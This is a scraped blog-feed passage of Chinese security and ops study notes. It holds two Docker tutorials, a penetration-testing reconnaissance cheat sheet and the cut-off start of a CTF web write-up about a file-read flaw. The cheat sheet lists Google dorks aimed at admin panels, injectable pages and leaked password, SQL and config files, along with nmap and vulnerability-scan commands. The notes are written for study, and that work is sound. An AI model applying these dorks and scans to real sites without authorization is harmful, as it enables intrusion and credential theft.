overlay2/68595846d6ec0d0d459db6d4e2c5ea24f912507f12a6d3fa9b8c09f4d279a830/diff:/var/lib/docker/overlay2/5c490f1745a988a9f10ee02a5dd8d29303501a6ced9ca63f4467ef19b4554b37/diff:/var/lib/docker/overlay2/b4749da2903824af7a466dd462f520be1253b7ccde4a2c9fa0b0a024d19ea90b/diff:/var/lib/docker/overlay2/62eb6beb7057f1d9560c80512761cda66c75430db0feab90593bc849deaacf27/diff:/var/lib/docker/overlay2/e49935005bc3bdb1cd18c5a9bd8b2c7e1511ee9cf47dd4a583f10df3bbf54b77/diff&quot;, &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/ebebfaa4b93ab4d3ff6427c01ec419d58ee297be87c2eedbc2dcd4de5167b334/merged&quot;, &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/ebebfaa4b93ab4d3ff6427c01ec419d58ee297be87c2eedbc2dcd4de5167b334/diff&quot;, &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/ebebfaa4b93ab4d3ff6427c01ec419d58ee297be87c2eedbc2dcd4de5167b334/work&quot; &#125;, &quot;Name&quot;: &quot;overlay2&quot; &#125;, &quot;Mounts&quot;: [ &#123; &quot;Type&quot;: &quot;volume&quot;, &quot;Name&quot;: &quot;ae7974b2803d720828fd3c681db9bb72f2352445847a757533387bc7af6b1654&quot;, &quot;Source&quot;: &quot;/var/lib/docker/volumes/ae7974b2803d720828fd3c681db9bb72f2352445847a757533387bc7af6b1654/_data&quot;, &quot;Destination&quot;: &quot;/var/lib/mysql&quot;, &quot;Driver&quot;: &quot;local&quot;, &quot;Mode&quot;: &quot;&quot;, &quot;RW&quot;: true, &quot;Propagation&quot;: &quot;&quot; &#125;, &#123; &quot;Type&quot;: &quot;bind&quot;, &quot;Source&quot;: &quot;/home/test/xiazhu&quot;, &quot;Destination&quot;: &quot;/app&quot;, &quot;Mode&quot;: &quot;&quot;, &quot;RW&quot;: true, &quot;Propagation&quot;: &quot;rprivate&quot; &#125; ], &quot;Config&quot;: &#123; &quot;Hostname&quot;: &quot;8d22f31c06c3&quot;, &quot;Domainname&quot;: &quot;&quot;, &quot;User&quot;: &quot;&quot;, &quot;AttachStdin&quot;: false, &quot;AttachStdout&quot;: false, &quot;AttachStderr&quot;: false, &quot;ExposedPorts&quot;: &#123; &quot;3306/tcp&quot;: &#123;&#125;, &quot;80/tcp&quot;: &#123;&#125; &#125;, &quot;Tty&quot;: false, &quot;OpenStdin&quot;: false, &quot;StdinOnce&quot;: false, &quot;Env&quot;: [ &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;, &quot;DEBIAN_FRONTEND=noninteractive&quot;, &quot;LANG=en_US.UTF-8&quot;, &quot;LANGUAGE=en_US:en&quot;, &quot;LC_ALL=en_US.UTF-8&quot;, &quot;REFRESHED_AT=2019-06-11&quot;, &quot;DOCKER_USER_ID=501&quot;, &quot;DOCKER_USER_GID=20&quot;, &quot;BOOT2DOCKER_ID=1000&quot;, &quot;BOOT2DOCKER_GID=50&quot;, &quot;PHPMYADMIN_VERSION=5.0.2&quot;, &quot;SUPERVISOR_VERSION=4.2.0&quot;, &quot;MYSQL_PASS:-$(pwgen=-s 12 1)&quot;, &quot;PHP_UPLOAD_MAX_FILESIZE=10M&quot;, &quot;PHP_POST_MAX_SIZE=10M&quot;, &quot;PHP_VERSION=7.4&quot; ], &quot;Cmd&quot;: [ &quot;/run.sh&quot; ], &quot;Image&quot;: &quot;mattrayner/lamp&quot;, &quot;Volumes&quot;: &#123; &quot;/app&quot;: &#123;&#125;, &quot;/var/lib/mysql&quot;: &#123;&#125; &#125;, &quot;WorkingDir&quot;: &quot;&quot;, &quot;Entrypoint&quot;: null, &quot;OnBuild&quot;: null, &quot;Labels&quot;: &#123;&#125; &#125;, &quot;NetworkSettings&quot;: &#123; &quot;Bridge&quot;: &quot;&quot;, &quot;SandboxID&quot;: &quot;af9a4d8af247e84a627282ec290a011617e05814cfc846ec08ded1b9459d83ee&quot;, &quot;HairpinMode&quot;: false, &quot;LinkLocalIPv6Address&quot;: &quot;&quot;, &quot;LinkLocalIPv6PrefixLen&quot;: 0, &quot;Ports&quot;: &#123; &quot;3306/tcp&quot;: null, &quot;80/tcp&quot;: [ &#123; &quot;HostIp&quot;: &quot;0.0.0.0&quot;, &quot;HostPort&quot;: &quot;80&quot; &#125; ] &#125;, &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/af9a4d8af247&quot;, &quot;SecondaryIPAddresses&quot;: null, &quot;SecondaryIPv6Addresses&quot;: null, &quot;EndpointID&quot;: &quot;f19367979298b5833f6b57b8943d8561e143b86254a90f342644f4fc97549170&quot;, &quot;Gateway&quot;: &quot;172.18.0.1&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;IPAddress&quot;: &quot;172.18.0.2&quot;, &quot;IPPrefixLen&quot;: 16, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;MacAddress&quot;: &quot;02:42:ac:12:00:02&quot;, &quot;Networks&quot;: &#123; &quot;bridge&quot;: &#123; &quot;IPAMConfig&quot;: null, &quot;Links&quot;: null, &quot;Aliases&quot;: null, &quot;NetworkID&quot;: &quot;9e04c1fc198894a540c9c53c7d2f51403aca4f6501be0650f04a370b39a8e9ad&quot;, &quot;EndpointID&quot;: &quot;f19367979298b5833f6b57b8943d8561e143b86254a90f342644f4fc97549170&quot;, &quot;Gateway&quot;: &quot;172.18.0.1&quot;, &quot;IPAddress&quot;: &quot;172.18.0.2&quot;, &quot;IPPrefixLen&quot;: 16, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;MacAddress&quot;: &quot;02:42:ac:12:00:02&quot;, &quot;DriverOpts&quot;: null &#125; &#125; &#125; &#125;] 进入当前正在运行的容器 12345678910111213141516171819202122232425#我们通常容器是使用后台方式运行的，需要进入容器，修改一些配置#命令#方式一docker exec -it 容器id /bin/bash#测试[root@iZ2oaf2ocgsgqtZ ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8d22f31c06c3 mattrayner/lamp &quot;/run.sh&quot; 8 days ago Up 8 days 0.0.0.0:80-&gt;80/tcp, 3306/tcp web_xiazhu[root@iZ2oaf2ocgsgqtZ ~]# docker exec -it 8d22f31c06c3 /bin/bashroot@8d22f31c06c3:/# lsapp boot etc lib64 opt run srv supervisor-4.2.0 sys varbd_build create_mysql_users.sh home media proc run.sh start-apache2.sh supervisord.log tmpbin dev lib mnt root sbin start-mysqld.sh supervisord.pid usr#方式二docker attach 容器id#测试[root@iZ2oaf2ocgsgqtZ ~]# docker attach 8d22f31c06c3正在运行...#docker exec #进入容器后开启一个新的终端，可以在里面操作（常用）#docker attach #进入容器正在执行的终端，不会启动新的进程！ 从容器拷贝文件到主机上 123456789101112131415161718192021222324252627docker cp 容器id:容器内路径 宿主机路径#运行容器，并进入容器内部[root@iZ2oaf2ocgsgqtZ ~]# docker run -it centos /bin/bash[root@0c1ac9169f8d /]# ls bin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var[root@0c1ac9169f8d /]# cd /home#创建一个新的文件[root@0c1ac9169f8d home]# touch test.java[root@0c1ac9169f8d home]# lstest.java[root@0c1ac9169f8d home]# [root@iZ2oaf2ocgsgqtZ ~]# ls[root@iZ2oaf2ocgsgqtZ ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES0c1ac9169f8d centos &quot;/bin/bash&quot; 57 seconds ago Up 57 seconds intelligent_jepsen#将该文件拷贝到/home[root@iZ2oaf2ocgsgqtZ ~]# docker cp 0c1ac9169f8d:/home/test.java /home[root@iZ2oaf2ocgsgqtZ ~]# ls[root@iZ2oaf2ocgsgqtZ ~]# cd ../[root@iZ2oaf2ocgsgqtZ /]# lsbin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var[root@iZ2oaf2ocgsgqtZ /]# cd home/[root@iZ2oaf2ocgsgqtZ home]# lstest test.java#拷贝是一个手动过程，未来我们使用 -v卷的技术，可以实现 小结 123456789101112131415161718192021222324252627282930313233343536373839404142attach Attach local standard input, output, and error streams to a running container #当前shell下attach 连接指定运行镜像 build Build an image from a Dockerfile #通过 Dockerfile定制镜像 commit Create a new image from a container&#x27;s changes #提交当前容器作为一个新的镜像 cp Copy files/folders between a container and the local filesystem #从容器中拷贝指定文件或者目录到宿主机中 create Create a new container #创建一个新的容器 diff Inspect changes to files or directories on a container&#x27;s filesystem #查看docker 容器变化 events Get real time events from the server #从docker服务获取容器的实时事件 exec Run a command in a running container #在已存在的容器上运行命令 export Export a container&#x27;s filesystem as a tar archive #导出容器的内容作为一个tar归档文件 history Show the history of an image #展示一个镜像的形成历史 images List images #列出系统当前镜像 import Import the contents from a tarball to create a filesystem image #从tar包中的内容创建一个新的文件系统映像 info Display system-wide information #显示系统相关信息 inspect Return low-level information on Docker objects #查看内容详细信息 kill Kill one or more running containers #kill指定容器 load Load an image from a tar archive or STDIN #从一个tar包中加载一个镜像 login Log in to a Docker registry #注册或者登入一个docker 源服务器 logout Log out from a Docker registry #从当前Docker registry退出 logs Fetch the logs of a container #输出当前容器日志信息 pause Pause all processes within one or more containers #暂停容器 port List port mappings or a specific mapping for the container #查看映射端口对应的容器内部源端口 ps List containers #列出容器列表 pull Pull an image or a repository from a registry #从docker镜像源服务器拉去指定镜像 push Push an image or a repository to a registry #推送指定镜像或者库镜像到docker源服务器 rename Rename a container #给一个容器改名 restart Restart one or more containers #重启运行的容器 rm Remove one or more containers #删除容器 rmi Remove one or more images #删除镜像 run Run a command in a new container #创建一个新的容器运行命令 save Save one or more images to a tar archive (streamed to STDOUT by default) #保存镜像为一个tar包 search Search the Docker Hub for images #在docker hub中搜索镜像 start Start one or more stopped containers #启动容器 stats Display a live stream of container(s) resource usage statistics #显示容器资源使用信息的实时流 stop Stop one or more running containers #停止容器 tag Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE #给源中的镜像打标签 top Display the running processes of a container #查看容器中运行的进程信息 unpause Unpause all processes within one or more containers #取消暂停容器 update Update configuration of one or more containers #更新容器的配置 version Show the Docker version information #查看docker版本 wait Block until one or more containers stop, then print their exit codes #截取容器停止时的退出状态值 作业练习 Docker 安装 Nginx 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#下载镜像 pull[root@iZ2oaf2ocgsgqtZ home]# docker pull nginxUsing default tag: latestlatest: Pulling from library/nginxbf5952930446: Already exists cb9a6de05e5a: Pull complete 9513ea0afb93: Pull complete b49ea07d2e93: Pull complete a5e4a503d449: Pull complete Digest: sha256:b0ad43f7ee5edbc0effbc14645ae7055e21bc1973aee5150745632a24a752661Status: Downloaded newer image for nginx:latestdocker.io/library/nginx:latest[root@iZ2oaf2ocgsgqtZ home]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEnginx latest 4bb46517cac3 11 hours ago 133MBcentos latest 0d120b6ccaa8 3 days ago 215MBmysql latest 0d64f46acfd1 9 days ago 544MBnginx &lt;none&gt; 8cf1bfb43ff5 3 weeks ago 132MBmattrayner/lamp latest 05750cfa54d5 3 weeks ago 915MBhello-world latest bf756fb1ae65 7 months ago 13.3kB#运行测试 run -d后台运行 --name给容器命名 -p指定端口 宿主机端口:容器内部端口[root@iZ2oaf2ocgsgqtZ home]# docker run -d --name nginx01 -p 8080:80 nginx29d6b80b8e8712a2c759738c426360d11077e82b62b40db65f89294e91abb32b[root@iZ2oaf2ocgsgqtZ home]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES29d6b80b8e87 nginx &quot;/docker-entrypoint.…&quot; 3 seconds ago Up 2 seconds 0.0.0.0:8080-&gt;80/tcp nginx010c1ac9169f8d centos &quot;/bin/bash&quot; 34 minutes ago Up 34 minutes intelligent_jepsen#访问测试[root@iZ2oaf2ocgsgqtZ home]# curl localhost:8080&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;/title&gt;&lt;style&gt; body &#123; width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;&lt;p&gt;If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.&lt;/p&gt;&lt;p&gt;For online documentation and support please refer to&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;Commercial support is available at&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;提示:阿里云的服务器的docker内的服务端口原理 Docker 安装 tomcat 1234567891011121314#官方的使用docker run -it --rm tomcat:9.0#我们之前的启动是后台启动，停止了容器之后，容器还是可以查到 docker run -it --rm 一般用来测试，用完就删除#下载再启动docker pull tomcat#启动运行docker run -d -p 3355:8080 --name tomcat01 tomcat#测试访问没问题#进入容器[root@iZ2oaf2ocgsgqtZ home]# docker exec -it tomcat01 /bin/bash#发现问题:1、linux命令少了，2没有webapps里面没东西。这是阿里云镜像的问题，默认最小镜像，所有不必要的一律删除，保证最小的运行环境 Docker 部署es +kibana 1234567891011121314151617181920212223242526272829303132333435363738#es 暴露的端口很多#es 十分的耗内存#es的数据一般需要放置到安全目录！挂载#--net somenetwork ? docker 网络配置#启动 elasticsearchdocker run -d --name elasticsearch01 -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:7.6.2#启动了之后 linux卡顿 docker stats查看cpu占用#es 是十分占内存的#查看docker CONTAINER ID NAME CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O PIDS2dcd19599a83 elasticsearch01 0.17% 1.242GiB / 3.69GiB 33.65% 1.01kB / 0B 0B / 824kB 423d10d3fa72fd tomcat01 0.12% 76.38MiB / 3.69GiB 2.02% 1.5kB / 276B 0B / 0B 360c1ac9169f8d intelligent_jepsen 0.00% 1.48MiB / 3.69GiB 0.04% 1.66kB / 0B 0B / 0B 1#增加内存限制，修改配置文件-e 环境配置修改 ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot;[root@iZ2oaf2ocgsgqtZ home]# docker run -d --name elasticsearch02 -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:7.6.2 [root@iZ2oaf2ocgsgqtZ home]# curl localhost:9200&#123; &quot;name&quot; : &quot;24b3b8117701&quot;, &quot;cluster_name&quot; : &quot;docker-cluster&quot;, &quot;cluster_uuid&quot; : &quot;dwfVUp1qQn2PcvY6AoysRw&quot;, &quot;version&quot; : &#123; &quot;number&quot; : &quot;7.6.2&quot;, &quot;build_flavor&quot; : &quot;default&quot;, &quot;build_type&quot; : &quot;docker&quot;, &quot;build_hash&quot; : &quot;ef48eb35cf30adf4db14086e8aabd07ef6fb113f&quot;, &quot;build_date&quot; : &quot;2020-03-26T06:34:37.794943Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;8.4.0&quot;, &quot;minimum_wire_compatibility_version&quot; : &quot;6.8.0&quot;, &quot;minimum_index_compatibility_version&quot; : &quot;6.0.0-beta1&quot; &#125;, &quot;tagline&quot; : &quot;You Know, for Search&quot;&#125; 遗留问题 docker的两个容器通信问题 可视化 portainer(先用这个) 12docker run -d -p 8080:9000 \\--restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer Rancher(CI/CD使用) 什么 是 portainer？ Docker图形化管理工具，提供后台供我们操作","categories":[{"name":"linux运维","slug":"linux运维","permalink":"http://m0th.top/categories/linux%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://m0th.top/tags/docker/"}]},{"title":"docker从入门到精通(一)","slug":"docker从入门到精通-一","date":"2020-08-11T02:25:29.000Z","updated":"2021-03-26T09:45:27.456Z","comments":true,"path":"2020/08/11/docker从入门到精通-一/","link":"","permalink":"http://m0th.top/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/","excerpt":"最近在出题需要一些比较麻烦的环境配置就学了一下docker，我是跟着b站的狂神师傅学的，感觉讲的很不错，这是我写下的一些笔记。","text":"最近在出题需要一些比较麻烦的环境配置就学了一下docker，我是跟着b站的狂神师傅学的，感觉讲的很不错，这是我写下的一些笔记。 Docker概述 Docker为什么会出现 一款产品：开发–上线 两套环境！ 应用环境，应用配置！ 开发—运维。解决的问题：我在我的电脑上能运行！版本更新，导致服务不可用！ 环境配置十分麻烦，每个机器都要部署环境（集群redis、es、Hadoop…..）!费时费力 工程问题：发布项目（jar+(redis Mysql jdk es))，项目能不能带上环境安装打包 java可以跨平台，但是应用环境配置麻烦，而且不能跨平台 想要windows上编写的项目，快速发布到linux 传统：开发jar，运维来做！ 现在：开发打包部署上线，一套流程做完 java –apk –发布（应用商店）–张三使用apk–安装即可使用 java–jar（环境）–打包项目打上环境（镜像）–docker仓库—下载发布我们的镜像—直接运行 docker给以上问题提出了解决方案 docker的思想来源于集装箱！ jre–多个应用(可能会产生端口冲突)–原来都是交叉的！ 隔离：docker的核心思想！打包装箱！每个箱子相互隔离。 docker通过隔离机制，可以将服务器利用到极致! 本质：所有的技术产生都是因为出现了一些问题，需要手段去解决！ docker的历史 2010年，几个搞IT的年轻人，在美国成立了一家公司 dotCloud 做一些 pass的云计算服务！lxc有关的容器技术！ 他们将自己的技术（容器化技术）命名为docker！ docker刚刚诞生的时候，并没有引起行业的注意!dotCloud,企业活不下去！ 于是，2013，开源 开放源代码！ docker越来越多的人返现了docker的优点！火了，Docker每个月都会有新的版本! 2014年4月9，docker1.0发布！ docker为什么这么火？十分的轻巧！ 在容器技术出现前，我们一直采用的是虚拟机技术！ 虚拟机技术：在windows中装一个VMware，通过然间我们可以虚拟出一台或者多台的电脑 工作原理： 缺点：十分笨重，基本都是10几个GB以上 虚拟机和docker都属于虚拟化技术！ 到现在，docker成为所有开发人员必备技能 ! 聊docker Docker是基于Go语言开发的！开源项目！ 官网：https://www.docker.com/ 文档地址: https://docs.docker.rom/ Docker的文档是超级详细的！ 仓库地址：https://hub.docker.com/ Docker能干嘛 之前的虚拟机技术 虚拟机技术缺点： 1、资源占用十分多 2、冗余步骤多 3、启动慢！ 容器化技术 比较docker和虚拟机技术的不同： 传统虚拟机，虚拟出一套硬件，运行一个完整地操作系统，然后在这个系统上安装和运行软件 容器内的应用直接运行在宿主机的内容，容器没有自己的内核，也没有我们的硬件，相对轻便 每个容器间相互隔离，每个容器内都有一个属于自己的文件系统，互不影响 DevOps(开发、运维) 更快速的交付和部署 传统：一堆帮助文档，安装程序 Docker：打包镜像发布测试，一键运行 更便捷的升级和扩缩容 使用了Docker只有，我们部署应用就和搭积木一样！ 项目打包为一个镜像，扩展 服务器A！服务器B 更简单的运维 在容器化之后，开发和测试环境高度一致 更高效的计算资源利用 Docker是内核级别的虚拟化，可以在一个物理机上运行很多容器实例！服务器的性能可以被压榨到极致。 Docker安装 Docker基本组成 镜像（image）： docker镜像好比一个模板，可以通过这个模板来创建容器服务，tomcat镜像=&gt;run=&gt;tomcat01容器（提供服务）。通过这个镜像可以创建多个容器（最终服务运行或者项目运行就是在容器中的） 容器（container）： Docker利用容器技术，独立运行一个或者多个组应用，通过镜像来创建的。 启动，停止，删除，基本命令 目前就可以把这个容器理解为简易的linux系统 仓库（repository）: 仓库就是存放镜像的地方！ 仓库氛围公用仓库和私有仓库！ 阿里云，有镜像加速器（容器仓库！） 安装Docker 环境准备 1、一点点linux基础 2、centos 3、xshell 环境查看 123#系统内核 3.10以上[root@iZ2oaf2ocgsgqtZ ~]# uname -r4.18.0-193.el8.x86_64 1234567891011121314151617[root@iZ2oaf2ocgsgqtZ ~]# cat /etc/os-releaseNAME=&quot;CentOS Linux&quot;VERSION=&quot;8 (Core)&quot;ID=&quot;centos&quot;ID_LIKE=&quot;rhel fedora&quot;VERSION_ID=&quot;8&quot;PLATFORM_ID=&quot;platform:el8&quot;PRETTY_NAME=&quot;CentOS Linux 8 (Core)&quot;ANSI_COLOR=&quot;0;31&quot;CPE_NAME=&quot;cpe:/o:centos:centos:8&quot;HOME_URL=&quot;https://www.centos.org/&quot;BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;CENTOS_MANTISBT_PROJECT=&quot;CentOS-8&quot;CENTOS_MANTISBT_PROJECT_VERSION=&quot;8&quot;REDHAT_SUPPORT_PRODUCT=&quot;centos&quot;REDHAT_SUPPORT_PRODUCT_VERSION=&quot;8&quot; 安装 查看帮助文档 https://docs.docker.com/engine/install/ 1234567891011121314151617181920212223242526272829303132333435#卸载旧版本$ sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine\\#需要的安装包yum install -y yum-utils#设置镜像的仓库sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo#默认是国外的sudo yum-config-manager \\ --add-repo \\ https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo#推荐使用阿里云#更新 yum软件包索引yum makecache fast#安装 docker相关yum install docker-ce docker-ce-cli containerd.io#启动 dockersystemctl start docker#使用docker version 查看是否安装成功docker version#测试hello-worlddocker run hello-world#查看一下镜像[root@iZ2oaf2ocgsgqtZ ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEnginx latest 8cf1bfb43ff5 3 weeks ago 132MBmattrayner/lamp latest 05750cfa54d5 3 weeks ago 915MBhello-world latest bf756fb1ae65 7 months ago 13.3kB 了解：卸载docker 123456#1、卸载依赖包yum remove docker-ce docker-ce-cli containerd.io#2、删除资源路径rm -rf /var/lib/docker#/var/lib/docker docker的默认工作路径 阿里云镜像加速 12345678sudo mkdir -p /etc/docker #创建目录sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;&#123; &quot;registry-mirrors&quot;: [&quot;https://4v2gnxz2.mirror.aliyuncs.com&quot;]&#125;EOF # 编写配置文件sudo systemctl daemon-reload # 重新加载服务配置文件sudo systemctl restart docker #重启docker服务 回顾hello-world流程 Docker工作原理 Docker是怎么工作的？docker是一个c/s架构的系统，Docker的守护进程运行在主机上。通过socket从客户端访问！ dockerserver接受到 Docker为什么比VM快1、Docker有着比虚拟机更少的抽象层 2、 docker利用的是宿主机的内核，vm需要 Guest OS。 所以说，新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统内核，避免引导。虚拟机是加载Guest OS，分钟级别的，而docker是利用宿主机的操作系统，省略了这个复杂的过程，秒级的","categories":[{"name":"linux运维","slug":"linux运维","permalink":"http://m0th.top/categories/linux%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://m0th.top/tags/docker/"}]},{"title":"信息收集的一些姿势","slug":"信息收集的一些姿势","date":"2020-08-10T13:43:11.000Z","updated":"2021-02-09T15:58:33.451Z","comments":true,"path":"2020/08/10/信息收集的一些姿势/","link":"","permalink":"http://m0th.top/2020/08/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A7%BF%E5%8A%BF/","excerpt":"还记得某位大神说，渗透测试的灵魂就是信息收集，就最近所学的知识记下了一些笔记","text":"还记得某位大神说，渗透测试的灵魂就是信息收集，就最近所学的知识记下了一些笔记 域名信息收集通过whois进行查询注册信息（两种方式） web接口查询：https://whois.aliyun.com https://www.whois365.com.cn https://whois.chinaz.com/ https://whois.aizhan.com 通过kali linux下 自带的whois查询工具，通过命令进行whois查询 使用方法即 whois domian 子域名信息收集1子域名挖掘工具 如：Maltego CE、wydomain、subDomainsBrute、dnsmaper、layer子域名挖掘机 2搜索引擎（谷歌hacker语法） site:sina.com 3web接口查询：http://tool.chinaz.com/subdomian https://dnsdumpster.com/ 4基于证书透明公开日志枚举：https://crt.sh/ http://censys.io 5其他途径：https://phpinfo.me/domain http://dns.aizhan.com web站点信息收集cms指纹识别1.在线工具 https://whatweb.bugscaner.com/look/ https://www.yunsee.cn/finger.html 2本地工具 whatweb 御剑指纹识别 大禹cms识别程序 https://github.com/Ms0x0/Dayu 根据cms进行漏洞查询对于查询到的cms利用https://bugs.shuimugan.com网站进行查询 目录与隐藏文件探测御剑、wwwscan、dirb、dirbuster等等工具 判断网页静态还是动态通过访问/index.html 成功即是静态网页 而通过访问 /index.php /index.jsp 等带着后端脚本语言的扩展名 成功即为该脚本语言编写的后端的动态网页 通过默认页面判断服务器的操作系统通过访问/Index. 报错来判断是win系统还是linux系统 因为win系统对大小写不敏感而linux对大小写敏感 敏感信息收集谷歌黑客语法 关键字 含义 site 搜所指定域名 例如:site:baidu.com inurl 指定url中是否存在某些关键字 例如：inurl:php?id= intext 指定网页中是否存在某些关键字 例如：intext:网站管理 filetype 指定搜索文件类型 例如：flietype:txt intitle 指定网页标题是否存在某些关键字 例如：intitle:后台管理 link 指定网页链接 link:baidu.com 指定月百度做了外链的站点 info 指定搜索网页信息 info:baidu.com 常用姿势 查找后台地址：site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms 查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username 查找可注入点：site:域名 inurl:aspx|jsp|php|asp 查找上传漏洞：site:域名 inurl:file|load|editor|Files 找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit 存在的数据库：site:域名 filetype:mdb|asp|# 查看脚本类型：site:域名 filetype:asp/aspx/php/jsp 迂回策略入侵：inurl:cms/data/templates/images/index/ 各种敏感数据收集： filetyle:xls inurl:gov username password inurl:phpmyadmin/main.php intitle:phpmyadmin filetype:inc inurl:config.inc host filetype:sql cdb_members inurl:forumdata filetype:txt inurl:”新建文本文档.txt”密码 inurl:phpinfo.php intitle:”phpinfo()””PHP Version”+”Server API” filetype:log inurl:log mdb 主机探测二层主机发现在局域网中使用基于数据链路层的arp协议 arping工具（单个主机扫描） netdiscover工具 （对特定子网进行扫描） 三层主机发现可以远程发现网络层的协议 经过路由的主机 使用ICMP协议 经常被防火墙过滤 ping工具（单个） fping（多个主机） hping3（发送自定义的icmp包） 四层主机发现传输层 TCP、UDP 可以远程探测 nmap IP hping3 –udp -c 1000 -p 80 ip nwatch等python脚本 端口扫描信息收集 目标探测 服务判断 系统判断 系统角色分析 端口是设备与外界通讯交流的出口。端口可以分为虚拟端口和物理端口 一个开放的端口代表一个提供的服务，不同的服务具有不同的端口号 端口扫描工具nmap ip Dmitry -p ip （进行tcp端口扫描） netcat -nvz ip（netcat又可以输入为nc） 端口的分类（0~65535）tcp端口和udp端口。tcp和udp协议独立，可以同时存在tcp235端口和udp235端口 周知端口（0~1023） 周知端口就是众所周知的端口号（默认了端口对应的服务） 动态端口（49152~65535） 不固定某种服务，动态分配 注册端口（1024~49151） 分配给用户进程或者应用程序 端口banner信息获取nmap IP –script banner -p 端口号 dmitry -pb ip nc -nv ip 20-30 端口服务版本和操作系统版本的信息端口服务版本信息：nmap -p 端口号 -sV IP地址 操作系统版本信息：namp -O ip 所有信息：namp -A -v IP地址 漏洞扫描漏洞扫描原理：通过发送对应的验证数据到目标具体服务进行验证。当收的响应与存在漏洞的响应一致时，表明存在漏洞 系统漏洞扫描nmap –script vuln ip nessus 系统漏洞扫描 metaspliot进行漏洞利用 web应用程序漏洞扫描owasp zap漏洞扫描器 nikto -host ip 漏洞扫描 sqlmap等漏洞利用工具使用 通过ping 命令反回的ttl值判断系统类型ttl&lt;128 win系统 ttl&lt;64 linux 系统 每过一个路由器ttl减1","categories":[{"name":"渗透测试学习笔记","slug":"渗透测试学习笔记","permalink":"http://m0th.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://m0th.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"[安洵杯 2019]easy—_web","slug":"安洵杯-2019-easy—-web","date":"2020-08-09T14:12:59.000Z","updated":"2021-02-19T12:53:09.981Z","comments":true,"path":"2020/08/09/安洵杯-2019-easy—-web/","link":"","permalink":"http://m0th.top/2020/08/09/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy%E2%80%94-web/","excerpt":"因为waf的问题，反斜杠逃逸绕过黑名单，这个题的这个考点很有趣","text":"因为waf的问题，反斜杠逃逸绕过黑名单，这个题的这个考点很有趣 尝试之路加wp观察源代码和get所传参数可猜测img所传参数img就是该图片经过两次base64编码和一次hex编码后可得555.png成果验证猜测 然后发现该图片以data元数据封装的方式放到了源码里猜测可以通过此漏过获得index.php的源码 于是将img处参数设为经过两次base64编码和一次hex编码后的index.php成功获得index.php源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = 